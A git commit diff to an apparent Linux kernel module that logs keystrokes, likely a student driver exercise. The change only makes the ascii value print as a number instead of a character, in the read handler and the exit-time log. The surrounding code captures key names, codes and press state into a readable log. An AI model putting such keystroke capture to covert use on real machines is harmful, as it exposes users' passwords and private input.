16ced9cb319a633f5fcd3c50813b9ce103f96ef7
waltibee <waltibee@gmail.com>
2026-06-09 14:18:27 +0200

    made the ascii log the number instead of the chacacter as it fucks the logs less

--- mandatory/main.c
+++ mandatory/main.c
@@ -50,10 +50,9 @@ static ssize_t	dni_read(struct file *file, char __user *out, size_t len, loff_t 
 	spin_lock_irqsave(&log_spinlock, flags);
 	list_for_each_entry(entry, &keystroke_list, list) {
 		int	n = snprintf(tmp_buf + total_size, 1024 * 64 - total_size,
-				     "%02d:%02d:%02d %s (%lld), ascii code : \'%c\',  %s\n",
+				     "%02d:%02d:%02d %s (%lld), ascii code : %d,  %s\n",
 				     entry->tm.tm_hour, entry->tm.tm_min, entry->tm.tm_sec,
-				     entry->key.name, entry->key.keycode,
-				     entry->key.ascii ? entry->key.ascii : ' ',
+				     entry->key.name, entry->key.keycode, entry->key.ascii,
 				     entry->down ? "Pressed" : "Released");
 		total_size += n;
 	}
@@ -157,10 +156,9 @@ static void __exit dni_exit(void)
 		total++;
 	list_for_each_entry(cursor, &keystroke_list, list) {
 		if (total - count <= 10 ) {
-			pr_info("%02d:%02d:%02d %s (%llu), ascii : \'%c\', %s\n",
+			pr_info("%02d:%02d:%02d %s (%llu), ascii : %d , %s\n",
 				cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
-				cursor->key.name, cursor->key.keycode,
-				cursor->key.ascii ? cursor->key.ascii : ' ',
+				cursor->key.name, cursor->key.keycode, cursor->key.ascii,
 				cursor->down ? "pressed" : "released");
 		}
 		count++;
